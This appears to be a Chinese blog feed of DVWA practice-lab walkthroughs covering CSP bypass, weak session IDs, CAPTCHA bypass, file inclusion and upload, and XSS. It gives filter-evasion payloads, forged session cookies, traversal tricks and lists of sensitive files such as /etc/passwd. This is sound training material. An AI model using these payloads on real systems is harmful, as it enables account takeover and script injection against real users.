src="/2021/02/02/dvwa9/2.jpg" alt="2" style="zoom: 50%;"></p><h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><p><code>The page makes a call to ../..//vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.</code>页面调用了jsonp.php,该页面可执行自己的代码</p><p>在页面源码中看到了</p><p><img src="/2021/02/02/dvwa9/3.jpg" alt="3"></p><p>打开</p><p><img src="/2021/02/02/dvwa9/4.jpg" alt="4"></p><p>主要规划了点击按钮后的操作，<code>appendChild（）</code>处理的<code>jsonp.php</code>里倒没有什么特别的处理，故我们可以从这里要传入的<code>callback</code>下手：</p><p>构造：<code>include=&lt;script src=&quot;source/jsonp.php?callback=alert(&#39;lisa&#39;);&quot;&gt;&lt;/script&gt;</code></p><img src="/2021/02/02/dvwa9/5.jpg" alt="5" style="zoom:50%;"><h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p><code>impossible.php</code>，<code>impossible.js</code>都和high没什么区别，关键在于<code>appendChild（）</code>处理的<code>jsonp.php</code>处理不同：</p><p>这是high的</p><p><img src="/2021/02/02/dvwa9/6.jpg" alt="6"></p><p>这个是impossible的</p><p><img src="/2021/02/02/dvwa9/7.jpg" alt="7"></p><p>参考：<a href="https://www.cnblogs.com/linfangnan/p/13714694.html">DVWA 通关指南：CSP Bypass(CSP 绕过)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA||Weak Session IDs</title>
    <link href="/2021/02/01/dvwa8/"/>
    <url>/2021/02/01/dvwa8/</url>
    
    <content type="html"><![CDATA[<p>用户访问服务器的时候，在服务器端会创建一个会话(Session)，会话中会保存用户的状态和相关信息，用于标识用户。服务器端认证时，浏览器需要把当前用户持有的SessionID告知服务器。用户拿到session id就会加密后保存到 cookies 上，之后只要cookies随着http请求发送服务器，服务器就能识别用户。因此攻击者可以通过窃取用户SessionID，使用该SessionID登录进目标账户。</p><h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><p>点击<code>Generate</code>，<code>Burpsuite</code>抓包，每<code>go</code>一次，响应中dvwasession就加一</p><p><img src="/2021/02/01/dvwa8/1.jpg" alt="1"></p><p>构造payload:<code>Cookie: dvwaSession=3; PHPSESSID=e34amjsmbj3phlmuk0u17vd1p3; security=low</code></p><p>即可在无密码情况下登录到页面</p><img src="/2021/02/01/dvwa8/2.jpg" alt="2" style="zoom: 33%;"><h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><img src="/2021/02/01/dvwa8/3.jpg" alt="3" style="zoom:50%;"><p>执行几次发现dvwasession的变化与时间戳一致，在<a href="https://tool.lu/timestamp/">转换工具</a>进行转换可知</p><p>构造<code>Cookie: dvwaSession=1612194327; PHPSESSID=e34amjsmbj3phlmuk0u17vd1p3; security=medium</code>登录即可</p><h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><p>使用了PHP setcookie()函数进行设置:</p><p>格式：</p><pre><code class="hljs pgsql">setcookie(<span class="hljs-type">name</span>,<span class="hljs-keyword">value</span>,expire,<span class="hljs-type">path</span>,<span class="hljs-keyword">domain</span>,secure,httponly)</code></pre><pre><code class="hljs properties"> <span class="hljs-meta">参数</span>              <span class="hljs-string">描述</span><span class="hljs-attr">name</span>     <span class="hljs-string">必需。规定cookie的名称。</span><span class="hljs-attr">value</span>     <span class="hljs-string">必需。规定cookie的值。</span><span class="hljs-attr">expire</span>   <span class="hljs-string">可选。规定cookie的有效期。</span><span class="hljs-attr">path</span>     <span class="hljs-string">可选。规定cookie的服务器路径。</span><span class="hljs-attr">domain</span>     <span class="hljs-string">可选。规定cookie的域名。</span><span class="hljs-attr">secure</span>     <span class="hljs-string">可选。规定是否通过安全的HTTPS连接来传输cookie。</span><span class="hljs-attr">httponly</span> <span class="hljs-string">可选。规定是否Cookie仅可通过HTTP协议访问。</span></code></pre><p><img src="/2021/02/01/dvwa8/4.jpg" alt="4"></p><p>抓包后，将value值进行逆操作，再解密构造payload即可。</p><h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p><img src="/2021/02/01/dvwa8/5.jpg" alt="5"></p><p>SHA-1是一种数据加密算法，该算法的思想是接收一段明文，然后以一种不可逆的方式将它转换成一段（通常更小）密文，也可以简单的理解为取一串输入码（称为预映射或信息），并把它们转化为长度较短、位数固定的输出序列即散列值（也称为信息摘要或信息认证代码）的过程。</p><p>PS：现实中应该没有这么简单的漏洞存在，这处理方法有点草率</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA||Insecure CAPTCHA</title>
    <link href="/2021/02/01/dvwa7/"/>
    <url>/2021/02/01/dvwa7/</url>
    
    <content type="html"><![CDATA[<p>Insecure CAPTCHA，不安全的验证码，CAPTCHA全称：Completely Automated Public Turing Test to Tell Computers and Humans Apart。验证码流程一般是:用户向浏览器的服务器发送请求，浏览器的服务器返回验证码给用户，用户将验证码发送给网站服务器，网站服务器会向浏览器的服务器验证这个验证码的正确性，浏览器最终返回验证结果给网站服务器。</p><p>服务器通过调用recaptcha_check_answer函数检查用户输入的正确性。</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">recaptcha_check_answer</span><span class="hljs-params">(<span class="hljs-variable">$privkey</span>,<span class="hljs-variable">$remoteip</span>, <span class="hljs-variable">$challenge</span>,<span class="hljs-variable">$response</span>)</span></span></code></pre><p>参数$privkey是服务器申请的private key ，$remoteip是用户的ip，$challenge 是recaptcha_challenge_field 字段的值，来自前端页面 ，$response是 recaptcha_response_field 字段的值。函数返回ReCaptchaResponse class的实例，ReCaptchaResponse 类有2个属性 ：</p><blockquote><p>$is_valid是布尔型的，表示校验是否有效，</p><p>$error是返回的错误代码。</p></blockquote><p>我们的绕过简而言之就是当验证不合格时，通过burp抓包工具修改成符合要求的数据包。修改参数标志位、USER-AGENT之类的参数。</p><h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><img src="/2021/02/01/dvwa7/1.jpg" alt="1" style="zoom:67%;"><p>源码中第一步检查验证码返回表单，第二步接受用户的表单再来进行修改。服务器仅仅通过检查Change，step参数来判断用户是否已经输入了正确的验证码。故我们抓包将step值修改为2即可绕过验证。也可以用CSRF攻击实现。</p><p><img src="/2021/02/01/dvwa7/2.jpg" alt="2"></p><h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><p><img src="/2021/02/01/dvwa7/3.jpg" alt="3"></p><p>本质上与low无区别，抓包时多修改一个<code>passed_captcha</code>值即可</p><h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><p><img src="/2021/02/01/dvwa7/4.jpg" alt="4"></p><p>$resp参数有浏览器返回，我们只能改参数<code>recaptcha_response_field、User-Agent</code></p><p><img src="/2021/02/01/dvwa7/5.jpg" alt="5"></p><h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p><img src="/2021/02/01/dvwa7/6.jpg" alt="6"></p><p>对返回值单独验证，并且本关要输入当前密码，<code>Anti-CSRF token ,PDO</code>也在。</p><p>参考：<a href="https://www.freebuf.com/articles/web/119692.html">InsecureCAPTCHA</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA||File Inclusion&amp;File Upload</title>
    <link href="/2021/01/27/dvwa5/"/>
    <url>/2021/01/27/dvwa5/</url>
    
    <content type="html"><![CDATA[<h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h1><h2 id="文件包含与漏洞"><a href="#文件包含与漏洞" class="headerlink" title="文件包含与漏洞"></a>文件包含与漏洞</h2><p>开发人员将相同的函数写入单独的文件中,需要使用某个函数时直接调用此文件,无需再次编写,这种文件调用的过程称文件包含。</p><p>文件包含函数的参数没有经过过滤或者严格的定义，并且参数可以被用户控制，这样就可能包含非预期的文件。如果文件中存在恶惹代码，无论文件是什么类型，文件内的恶意代码都会被解析并执行。<br>文件包含漏洞可能会造成服务器的网页被篡改、网站被挂马、服务器被远程控制，被安装后门等危害。</p><h2 id="文件包含常用函数"><a href="#文件包含常用函数" class="headerlink" title="文件包含常用函数"></a>文件包含常用函数</h2><ul><li>include。包含并运行指定文件，include在出错时产生警告(E_WARNING)，脚本会继续运行。</li><li>include_once。在脚本执行期间包含并运行指定文件。该函数和include函数类似，但使用该函数时，PHP会检查指定文件是否已经被包含过，如果是，则不会再次包含。</li><li>require。包含并运行指定文件。require在出错时产生E_COMPILE_ERROR级别的错误，导致脚本中止运行。</li><li>require_once。它和require函数类似，但使用该函数时，PHP会检查指定文件是否已经被包含过，如果是，则不会再次包含。</li></ul><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><h3 id="无限制本地文件包含"><a href="#无限制本地文件包含" class="headerlink" title="无限制本地文件包含"></a>无限制本地文件包含</h3><p>代码中没有为包含文件指定特定的前缀或者.php、html等扩展名，因此攻击者可以利用文件包含漏洞读取操作系统中的其他文件，获取敏感信息，或者执行其他文件中的代码。</p><h3 id="有限制本地文件包含"><a href="#有限制本地文件包含" class="headerlink" title="有限制本地文件包含"></a>有限制本地文件包含</h3><p>代码中为包含文件指定了特定的前缀或者.php、.html等扩展名，攻击者需要绕过前缀或者扩展名过滤，才能利用文件包含漏洞读取操作系统中的其他文件，获取敏感信息。常见的有限制本地文件包含过滤绕过的方式主要有%00截断文件包含、路径长度截断文件包含、点号截断文件包含这3种。</p><h3 id="常见的敏感信息路径"><a href="#常见的敏感信息路径" class="headerlink" title="常见的敏感信息路径"></a>常见的敏感信息路径</h3><p>利用本地文件包含漏洞可以获取系统本地的其他文件的内容。<br> Windows系统常见敏感文件如下：</p><pre><code class="hljs latex">c:<span class="hljs-tag">\<span class="hljs-name">boot</span></span>.ini系统版本信息c:<span class="hljs-tag">\<span class="hljs-name">xxx</span></span><span class="hljs-tag">\<span class="hljs-name">php</span></span>.ini PHP配置信息。c:<span class="hljs-tag">\<span class="hljs-name">xxx</span></span><span class="hljs-tag">\<span class="hljs-name">my</span></span>.ini MySQL配置信息。c: <span class="hljs-tag">\<span class="hljs-name">xxx</span></span><span class="hljs-tag">\<span class="hljs-name">httpd</span></span>.conf Apache配置信息。</code></pre><p>linux:</p><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>passwd Linux系统账号信息。<span class="hljs-regexp">/etc/</span>httpd<span class="hljs-regexp">/conf/</span>httpd.conf Apache配置信息。<span class="hljs-regexp">/etc/my</span>.conf MySQL配置信息。<span class="hljs-regexp">/usr/</span>etc/php.ini PHP配置信息。</code></pre><h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><h3 id="无限制远程文件包含"><a href="#无限制远程文件包含" class="headerlink" title="无限制远程文件包含"></a>无限制远程文件包含</h3><p>无限制远程文件包含是指包含文件的位置并不是本地服务器，而是通过URL.的形式包含其他服务器上的文件，执行文件中的恶意代码<br>漏洞利用条件为<code>allow_url_fopen=on和 allow_url_include=on</code></p><h3 id="有限制远程文件包含"><a href="#有限制远程文件包含" class="headerlink" title="有限制远程文件包含"></a>有限制远程文件包含</h3><p>有限制远程文件包含是指当代码中存在特定的前缀或者，php，htrul等扩展名过滤时，攻击者需要绕过前缀或者扩展名过滤，才能执行远程URL中的恶意代码。</p><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>页面中有3个文件，分别点击url中pag的参数值改变。</p><h3 id="本地文件包含-1"><a href="#本地文件包含-1" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>先在可控参数值位置输入一个不存在的文件进行访问</p><p><img src="/2021/01/27/dvwa5/1.jpg" alt="1"></p><p>报错信息中含绝对路径，网站根目录为\dvwa\ ，include.php到网站根目录共隔了两个文件夹，我们可以返回到根目录去访问一些敏感信息，比如PHP版本信息</p><p><img src="/2021/01/27/dvwa5/2.jpg" alt="2"></p><h3 id="远程文件包含-1"><a href="#远程文件包含-1" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><h4 id="包含本地服务器上的文件"><a href="#包含本地服务器上的文件" class="headerlink" title="包含本地服务器上的文件"></a>包含本地服务器上的文件</h4><p>在本地根目录创建一个文件，并访问如：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;genius&quot;</span> ; <span class="hljs-meta">?&gt;</span></code></pre><p>命名为jpg格式（其它格式也可，在HTTP中若文件有包含PHP代码，代码都会被执行)</p><img src="/2021/01/27/dvwa5/3.jpg" alt="3" style="zoom:67%;"><p>genius改成其它恶意代码</p><h4 id="包含远程服务器上的文件"><a href="#包含远程服务器上的文件" class="headerlink" title="包含远程服务器上的文件"></a>包含远程服务器上的文件</h4><p>可以包含Linux里的文件，远程连接（不展示辽)</p><h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><pre><code class="hljs lasso"><span class="hljs-comment">// Input validation</span>$file = str_replace( <span class="hljs-built_in">array</span>( <span class="hljs-string">&quot;http://&quot;</span>, <span class="hljs-string">&quot;https://&quot;</span> ), <span class="hljs-string">&quot;&quot;</span>, $file );$file = str_replace( <span class="hljs-built_in">array</span>( <span class="hljs-string">&quot;../&quot;</span>, <span class="hljs-string">&quot;..\&quot;&quot;</span> ), <span class="hljs-string">&quot;&quot;</span>, $file );</code></pre><p>源码中将输入的url参数中包含的<code>http://</code>，<code>https:// </code>，<code>. . /</code> ，<code>. . \</code>替换成空字符。只过滤了远程文件包含。</p><h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><p>与low一样</p><h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><p>构造:<code>httphttp://://127.0.0.1/1.jpg</code></p><p><img src="/2021/01/27/dvwa5/4.jpg" alt="4"></p><h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><pre><code class="hljs gams"><span class="hljs-comment">// Input validation</span><span class="hljs-keyword">if</span>( !fnmatch( <span class="hljs-string">&quot;file*&quot;</span>, <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> ) &amp;&amp; <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> != <span class="hljs-string">&quot;include.php&quot;</span> ) &#123;    <span class="hljs-comment">// This isn&#x27;t the page we want!</span>    echo <span class="hljs-string">&quot;ERROR: File not found!&quot;</span>;    exit;</code></pre><p>fnmatch() 函数根据指定的模式来匹配文件名或字符串。</p><p>语法</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">fnmatch</span><span class="hljs-params">(pattern,string,flags)</span></span></code></pre><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>pattern</td><td>必需。规定要检索的模式。</td></tr><tr><td>string</td><td>必需。规定要检查的字符串或文件。</td></tr><tr><td>flags</td><td>可选。</td></tr></tbody></table><p>本关用fnmatch（）检查file。介绍一个小知识:</p><p><strong>PHP 伪协议</strong></p><p>PHP带有很多内置URL.风格的封装协议，可用于<code>fopen，copy,file_exists和filesize</code>等文件系统函数。除了这些内置封装协议，还能通过stream_wrapper_register注册自题义的封装协议。这些协议都被称为伪协议。<br>常见的PHP伪协议如下：</p><pre><code class="hljs awk">file：<span class="hljs-regexp">//</span> 访问本地文件系统http:<span class="hljs-regexp">//</span> 访问HTTP(S)网址ftp:<span class="hljs-regexp">//</span> 访问FTP(S) URLphp：<span class="hljs-regexp">//</span> 访问各个输入输出流zlib：<span class="hljs-regexp">//</span> 处理压缩流data:<span class="hljs-regexp">//</span> 读取数据glob：<span class="hljs-regexp">//</span> 查找匹配的文件路径模式phar:<span class="hljs-regexp">//</span> PHP归档ssh2:<span class="hljs-regexp">//</span> Secure Shell <span class="hljs-number">2</span>rar：<span class="hljs-regexp">//</span> RAR数据压缩ogg：<span class="hljs-regexp">//</span> 处理音频流expect：<span class="hljs-regexp">//</span> 处理交互式的流</code></pre><p>本关构造：<code>file://D:/phpstudy_pro/WWW/1.jpg</code>即可~</p><h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><p><img src="/2021/01/27/dvwa5/5.jpg" alt="5"></p><h1 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h1><p>在upload-labs里详细介绍过了，这里简单讲一下</p><h2 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h2><p>basename() 函数返回路径中的文件名部分</p><p>语法</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">basename</span><span class="hljs-params">(path,suffix)</span></span></code></pre><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>path</td><td>必需。规定要检查的路径。</td></tr><tr><td>suffix</td><td>可选。规定文件扩展名。如果文件有 suffix，则不会输出这个扩展名</td></tr></tbody></table><p>没什么过滤，不赘述</p><h2 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h2><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">( ( <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&quot;image/jpeg&quot;</span> || <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&quot;image/png&quot;</span> )</span></span> &amp;&amp;    ( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) )</code></pre><p>限制文件大小和类型，抓包修改或者00截断（<strong>注意PHP版本</strong>）都可以</p><h2 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h2><p>多了一句：</p><pre><code class="hljs perl">$uploaded_ext  = <span class="hljs-keyword">substr</span>( $uploaded_name, strrpos( $uploaded_name, <span class="hljs-string">&#x27;.&#x27;</span> ) + <span class="hljs-number">1</span>);</code></pre><p>出现的函数upload-labs都讲过了，本关白名单，构造图片马，00截断都可</p><h2 id="impossible-1"><a href="#impossible-1" class="headerlink" title="impossible"></a>impossible</h2><p><img src="/2021/01/27/dvwa5/6.jpg" alt="6"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA||XSS(Reflected&amp;Stored&amp;DOM)</title>
    <link href="/2021/01/27/3/"/>
    <url>/2021/01/27/3/</url>
    
    <content type="html"><![CDATA[<h1 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h1><p>XSS是跨站脚本攻击(Cross Site Scripting)恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS的实质其实是HTML代码与Javscript代码的注入。但由于XSS的攻击对象是与客户对等的Browser端，因此常常不被开发者所重视。但xss漏洞危害很大，一旦被攻击成功，私密网页，会话，cookie(许多网页在登录后服务端会返回一个cookie值给用户端，这样用户就不用多次输入密码进行登录，但cookie如果被窃取，攻击者就可以肆意登录用户的账号，<strong>http-only可确保cookie不被盗用</strong>)等内容都会被窃取，还可能导致流量被劫持实现恶意跳转（比如在网页中插入一段<code>&lt;script&gt;window.location.href=&quot;任意网址&quot;;&lt;/script&gt;</code>就可以跳转到别的网址）。</p><p>举个栗子:</p><p>随便写个网页</p><pre><code class="hljs php-template"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span> </span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">bgcolor</span>=<span class="hljs-string">&quot;PowderBlue&quot;</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>查询<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;xss_input&quot;</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span></span><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php">$xss = $_GET[<span class="hljs-string">&#x27;xss_input&#x27;</span>];</span><span class="php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;输入值:&lt;br&gt;&#x27;</span>.$xss;</span><span class="php"><span class="hljs-meta">?&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span></code></pre><p>效果：</p><img src="/2021/01/27/3/2.jpg" alt="2" style="zoom:67%;"><p>有点简陋(html了解不多)，随便输入一下页面会正常回显</p><p><img src="/2021/01/27/3/3.jpg" alt="3"></p><p>查看页面源码</p><p><img src="/2021/01/27/3/4.jpg" alt="4"></p><p>原封不动输入了，我们换个值输入:<code>&lt;script&gt;alert(&#39;genius&#39;)&lt;/script&gt;</code></p><img src="/2021/01/27/3/5.jpg" alt="5" style="zoom:67%;"><p>这次不像第一次那样，而是执行了输入的代码，弹出一个框，这就存在xss漏洞。但并不是只有script标签才可以插入代码，HTML中还有<code>onerror,oneclick,onmouseover,Onload……</code>多种方式，格式如下：</p><pre><code class="hljs awk">onerror<span class="hljs-regexp">/oneclick/</span>onmouseover/Onload=“执行内容”</code></pre><p>其次还可插在<code>&lt;img&gt;,&lt;textarea&gt;……</code>标签里。</p><p>根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS，DOM型的XSS由于其特殊性，常常被分为第三种。</p><h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>反射型XSS又称非持久型XSS，这种攻击方式往往具有一次性。<br>攻击方式：攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接收该目标用户的请求并进行处理，然后服务器把带有XSS代码的数据发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS漏洞。常出现于钓鱼网站，邮箱等。</p><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>源码中有一个新函数：<code>array_key_exists() </code>:函数检查某个数组中是否存在指定的键名，如果键名存在则返回 true，如果键名不存在则返回 false。</p><p>本关并无过滤。测试一下：</p><p><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><img src="/2021/01/27/3/6.jpg" alt="6" style="zoom: 80%;"><p>获取cookie:</p><p><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p><p><img src="/2021/01/27/3/7.jpg" alt="7"></p><p>输入：</p><img src="/2021/01/27/3/8.jpg" alt="8" style="zoom:80%;"><p>就成功辽~</p><h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><p>源码用<code>str_replace</code>函数对<code>&lt;script&gt;</code>标签进行替换。</p><h3 id="嵌套绕过"><a href="#嵌套绕过" class="headerlink" title="嵌套绕过"></a>嵌套绕过</h3><p>构造：<code>&lt;scr&lt;script&gt;ipt&gt;alert(666)&lt;/script&gt;</code></p><img src="/2021/01/27/3/10.jpg" alt="10" style="zoom:50%;"><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p><code>&lt;Script&gt;alert(/genius/)&lt;/script&gt;</code></p><img src="/2021/01/27/3/11.jpg" alt="11" style="zoom:80%;"><h3 id="使用别的标签来绕过"><a href="#使用别的标签来绕过" class="headerlink" title="使用别的标签来绕过"></a>使用别的标签来绕过</h3><p><code>&lt;body onload=alert(&#39;genius&#39;)&gt;</code></p><p><code>&lt;a href=&#39;&#39; onclick=alert(&#39;genius&#39;)&gt;click&lt;/a&gt;</code></p><h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><pre><code class="hljs autoit">$name = preg_replace( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, $_GET[ <span class="hljs-string">&#x27;name&#x27;</span> ] )<span class="hljs-comment">;</span></code></pre><p>本关用了正则表达式，对<code>&lt;script&gt;</code>标签进行了严格的过滤，但没有过滤别的标签，此时可以通过img、body等标签的事件或者iframe(在一个HTML中嵌入另一个HTML)等标签的src注入恶意的js代码.</p><p><code>&lt;body onload=alert(&#39;jisso&#39;)&gt;</code></p><p><code>&lt;img src=&quot;&quot; onerror=alert(&#39;lisa&#39;)&gt;</code></p><p><code>&lt;a href=&#39;&#39; onclick=alert(&#39;rose&#39;)&gt;click&lt;/a&gt;</code></p><p><code>Iframe:&lt;iframe onload=alert(gennie)&gt;</code></p><p><code>&lt;body onmousemove=alert(&#39;genius&#39;)&gt;</code></p><h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><p><code>Anti-CSRF token</code>它又出来了</p><p><code>htmlspecialchars()</code></p><p>把预定义的字符转换为 HTML 实体。预定义字符：</p><ul><li>&amp; （和号）成为 &amp;</li><li>“ （双引号）成为 “</li><li>‘ （单引号）成为 ‘</li><li>&lt; （小于）成为 &lt;</li><li>&gt; （大于）成为 &gt;</li></ul><p>语法</p><pre><code class="hljs applescript">htmlspecialchars(<span class="hljs-built_in">string</span>,flags,<span class="hljs-built_in">character</span>-<span class="hljs-keyword">set</span>,double_encode)</code></pre><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><em>string</em></td><td>必需。规定要转换的字符串。</td></tr><tr><td><em>flags</em></td><td>可选。规定如何处理引号、无效的编码以及使用哪种文档类型。                              可用的引号类型：                                                                                                                                                                           ENT_COMPAT - 默认。仅编码双引号。                                                                                    ENT_QUOTES - 编码双引号和单引号。                                                                                           ENT_NOQUOTES - 不编码任何引号。</td></tr><tr><td><em>character-set</em></td><td>可选。一个规定了要使用的字符集的字符串。</td></tr><tr><td><em>double_encode</em></td><td>可选。布尔值，规定了是否编码已存在的 HTML 实体。  TRUE - 默认。将对每个实体进行转换。 FALSE - 不会对已存在的 HTML 实体进行编码。</td></tr></tbody></table><p>详情：<a href="https://www.w3school.com.cn/php/func_string_htmlspecialchars.asp">htmlspecialchars（）</a></p><h1 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h1><p>存储型XSS又称持久型XSS，攻击脚本将被永久地存放在目标服务器的数据库或文件中，具有很高的隐蔽性。</p><p>攻击方式：这种攻击多见于论坛、博客和留言板，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到执行。</p><h2 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h2><p><img src="/2021/01/27/3/12.jpg" alt="12"></p><p>本关只防御了SQL注入漏洞，并没有防御xss漏洞。</p><p>测试一下：<code>&lt;script&gt;alert(&#39;lisa&#39;)&lt;/script&gt;</code></p><p>发现name框里最多只能输入10个字符。有以下几种办法可以进行攻击：</p><h3 id="message框编辑"><a href="#message框编辑" class="headerlink" title="message框编辑"></a>message框编辑</h3><p>name限制了但是message框没有字符限制，测试一下：</p><img src="/2021/01/27/3/13.jpg" alt="13" style="zoom:50%;"><p>message框可以攻击，这是一种思路；</p><h3 id="在name框编辑，抓包篡改"><a href="#在name框编辑，抓包篡改" class="headerlink" title="在name框编辑，抓包篡改"></a>在name框编辑，抓包篡改</h3><p>抓包后在name框编辑即可。</p><h3 id="在js前端修改参数"><a href="#在js前端修改参数" class="headerlink" title="在js前端修改参数"></a>在js前端修改参数</h3><img src="/2021/01/27/3/15.jpg" alt="15" style="zoom:67%;"><p>将<code>maxlength</code>参数值改大即可。</p><h3 id="借助火狐的插件Tamper-Data"><a href="#借助火狐的插件Tamper-Data" class="headerlink" title="借助火狐的插件Tamper Data"></a>借助火狐的插件Tamper Data</h3><img src="/2021/01/27/3/17.jpg" alt="17" style="zoom:50%;"><p>一样在message编写</p><img src="/2021/01/27/3/16.jpg" alt="16" style="zoom:50%;"><p>本与在message框编写无太大差异，但这个插件只要随意输入值，无需构造xss即可获取cookie值，且可篡改头文件等多个信息。</p><h2 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h2><p><img src="/2021/01/27/3/18.jpg" alt="18"></p><p><code>addslashes() </code>函数返回在预定义字符之前添加反斜杠的字符串。</p><p>预定义字符是：</p><ul><li>单引号（’）</li><li>双引号（”）</li><li>反斜杠（\）</li><li>NULL</li></ul><p>只对<code>&lt;script&gt;</code>替换，与反射型xss的medium一样,<code>&lt;script&gt;</code>的嵌套大小写绕过，标签绕过(如下)，依旧用修改js前端，或者抓包的方法</p><p><code>&lt;body 